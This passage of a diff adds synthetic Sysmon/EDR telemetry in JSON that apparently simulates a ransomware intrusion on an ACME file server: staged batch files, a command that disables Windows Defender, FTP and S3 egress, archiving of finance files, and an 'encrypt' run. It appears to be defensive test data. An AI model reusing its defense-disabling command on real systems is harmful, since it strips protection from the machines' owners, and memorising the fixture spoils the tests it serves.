+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 40
+      },
+      "@timestamp": "2024-05-16T09:20:01.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920036,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 4192
+      },
+      "file": {
+        "name": "EXE.bat",
+        "path": "C:\\Windows\\Temp\\EXE.bat",
+        "hash": {
+          "md5": "4457256150386acec794e9e8ee412691",
+          "sha1": "c6d54322a17e754150e61f7caa91226a84b0b774",
+          "sha256": "10ce939e4ee8b5285d84c7d694481ebbdf986904938d07f7576d733e830ed012"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 41
+      },
+      "@timestamp": "2024-05-16T09:20:42.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920037,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 6588
+      },
+      "file": {
+        "name": "EXE1.bat",
+        "path": "C:\\Windows\\Temp\\EXE1.bat",
+        "hash": {
+          "md5": "573a213191985c555dd7e8de5f0a9cae",
+          "sha1": "aa19a1648d680c3bfbee7dcc3df41ce98af8e121",
+          "sha256": "ba9b879fdc304bd7f5554528fb8e858ef36ad4657fedfefb8495f43ce73fc6f1"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 42
+      },
+      "@timestamp": "2024-05-16T09:21:33.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920038,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 5454
+      },
+      "file": {
+        "name": "WMI1.bat",
+        "path": "C:\\Windows\\Temp\\WMI1.bat",
+        "hash": {
+          "md5": "90f9044cfee2c678fe51abd098bdfe97",
+          "sha1": "e3619582f4d81ca180dee161bbe49d499b237119",
+          "sha256": "c4863cc28e01713e6a857b940873b0e5caedfd1fcb9b2a8d07ffb4c0c48379d5"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 43
+      },
+      "@timestamp": "2024-05-16T09:23:10.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920039,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 6868
+      },
+      "file": {
+        "name": "RDP.bat",
+        "path": "C:\\Windows\\Temp\\RDP.bat",
+        "hash": {
+          "md5": "996ad32c7ae2190b7fa7876df0d7b717",
+          "sha1": "4a1e667e0c3550f4446903570adbe7776699d4ca",
+          "sha256": "791157675ad77b0ae9feabd76f4b73754a7537b7a9a2cc74bd0924d65be680e1"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 44
+      },
+      "@timestamp": "2024-05-16T09:23:51.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920040,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 3161
+      },
+      "file": {
+        "name": "DEF.bat",
+        "path": "C:\\Windows\\Temp\\DEF.bat",
+        "hash": {
+          "md5": "4794accd22271a28547fb3613ee79218",
+          "sha1": "ccc6b5bf9591fa9a3d57fd48ee0c9c49a6d22da9",
+          "sha256": "53828f56c6894a468a091c8858d2e29144b68d5de8ff1d69a567e97aac996026"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 45
+      },
+      "@timestamp": "2024-05-16T09:24:28.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920041,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 3117
+      },
+      "file": {
+        "name": "check.exe",
+        "path": "C:\\Windows\\Temp\\check.exe",
+        "hash": {
+          "md5": "6e91c474d90546845b1f3f9e7a33411a",
+          "sha1": "9352236ad6fe8835979cf11ba5033f8f2fef0f19",
+          "sha256": "3f97e112f0c5ddf0255ef461746a223208dc0846bde2a6dca9c825d9c706a4e9"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 46
+      },
+      "@timestamp": "2024-05-16T09:25:27.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920042,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "entity_id": "FS-01-e4a2ae9f-5007-479d-be2a-a092d614f326",
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /c sc stop WinDefend & powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+        "pid": 2793,
+        "parent": {
+          "executable": "C:\\Windows\\Temp\\DEF.bat",
+          "name": "DEF.bat",
+          "command_line": "C:\\Windows\\Temp\\DEF.bat"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "connection"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "3",
+        "action": "Network connection detected",
+        "sequence": 47
+      },
+      "@timestamp": "2024-05-16T09:31:33.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 3,
+        "record_id": 920043,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\ftp.exe",
+        "name": "ftp.exe",
+        "pid": 7510
+      },
+      "source": {
+        "ip": "10.10.19.217",
+        "port": 49546
+      },
+      "destination": {
+        "ip": "93.115.26[.]127",
+        "port": 21
+      },
+      "network": {
+        "transport": "tcp",
+        "protocol": "tcp",
+        "direction": "egress"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "connection"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "3",
+        "action": "Network connection detected",
+        "sequence": 48
+      },
+      "@timestamp": "2024-05-16T09:34:52.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 3,
+        "record_id": 920044,
+        "computer_name": "APP-02"
+      },
+      "host": {
+        "name": "APP-02",
+        "hostname": "APP-02",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\ftp.exe",
+        "name": "ftp.exe",
+        "pid": 7285
+      },
+      "source": {
+        "ip": "10.10.16.25",
+        "port": 60152
+      },
+      "destination": {
+        "ip": "46.21.250[.]52",
+        "port": 21
+      },
+      "network": {
+        "transport": "tcp",
+        "protocol": "tcp",
+        "direction": "egress"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "connection"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "3",
+        "action": "Network connection detected",
+        "sequence": 49
+      },
+      "@timestamp": "2024-05-16T09:39:24.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 3,
+        "record_id": 920045,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\curl.exe",
+        "name": "curl.exe",
+        "pid": 7955
+      },
+      "source": {
+        "ip": "10.10.18.234",
+        "port": 58971
+      },
+      "destination": {
+        "ip": "52.217.168.241",
+        "port": 443,
+        "domain": "s3.amazonaws.com"
+      },
+      "network": {
+        "transport": "tcp",
+        "protocol": "tcp",
+        "direction": "egress"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 50
+      },
+      "@timestamp": "2024-05-16T09:43:22.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920051,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "entity_id": "FS-01-97268cce-9fa4-4278-ae9d-a9c26e5c4c9a",
+        "executable": "C:\\Program Files\\7-Zip\\7z.exe",
+        "name": "7z.exe",
+        "command_line": "7z.exe a C:\\Backup\\daily_archive.7z D:\\Finance\\*.xlsx",
+        "pid": 6024,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\taskeng.exe",
+          "name": "taskeng.exe",
+          "command_line": "C:\\Windows\\System32\\taskeng.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 51
+      },
+      "@timestamp": "2024-05-16T09:49:55.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920046,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "entity_id": "FS-01-4d890e7d-0b58-490c-85a1-ada5a5b9ff14",
+        "executable": "C:\\Windows\\Temp\\check.exe",
+        "name": "check.exe",
+        "command_line": "C:\\Windows\\Temp\\check.exe -path D:\\Shares -encrypt",
+        "pid": 2635,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {
+        "name": "check.exe",
+        "path": "C:\\Windows\\Temp\\check.exe",
+        "hash": {
+          "md5": "6e91c474d90546845b1f3f9e7a33411a",
+          "sha1": "9352236ad6fe8835979cf11ba5033f8f2fef0f19",
+          "sha256": "3f97e112f0c5ddf0255ef461746a223208dc0846bde2a6dca9c825d9c706a4e9"
+        }
+      }
+    }
+  ]
+}
